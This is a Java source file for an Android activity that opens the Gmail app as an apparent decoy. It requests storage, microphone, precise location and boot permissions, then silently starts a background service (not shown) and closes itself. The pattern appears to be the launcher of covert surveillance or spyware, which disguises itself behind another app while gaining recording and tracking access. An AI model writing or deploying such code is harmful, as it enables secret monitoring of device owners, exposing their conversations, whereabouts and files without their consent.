package tw.com.darkcorner.backgroundworker;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

public class backgroundWorker extends Activity {
    public static final String TAG = "BgWorker";
    protected static final int MY_PERMISSIONS_LIST = 13;
    private Intent mImplicitAppIntent;


    private void startBackgroundThread()
    {
        mImplicitAppIntent = new Intent(this, ImplicitApp.class);
        mImplicitAppIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startService(mImplicitAppIntent);
        finish();
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            Intent gmailIntent = getPackageManager().getLaunchIntentForPackage("com.google.android.gm");
            gmailIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(gmailIntent);
        } catch (Exception e)
        {
            Log.i(TAG, "Failed to find class.");
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
        ||  ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
        ||  ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
        ||  ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
        ||  ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_BOOT_COMPLETED) != PackageManager.PERMISSION_GRANTED
                ) {
            Log.i(TAG, "Requesting permission");
            ActivityCompat.requestPermissions(this, new String[] {android.Manifest.permission.READ_EXTERNAL_STORAGE,android.Manifest.permission.WRITE_EXTERNAL_STORAGE, android.Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.RECEIVE_BOOT_COMPLETED}, MY_PERMISSIONS_LIST);
        }else {
            Log.i(TAG, "Permission sufficient.");
            startBackgroundThread();
        }


    }

    @Override
    public void onRequestPermissionsResult(int requestCode,String[] permissions, int[] grantResults)
    {
        switch (requestCode)
        {
            case MY_PERMISSIONS_LIST:
                Log.i(TAG, "Processing response.");
                if (grantResults.length == 5 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                {
                    Log.i(TAG, "Permissions request granted.");
                    startBackgroundThread();
                }else
                    Log.i(TAG, "Insufficient permissions.");
                break;
        }
    }
}
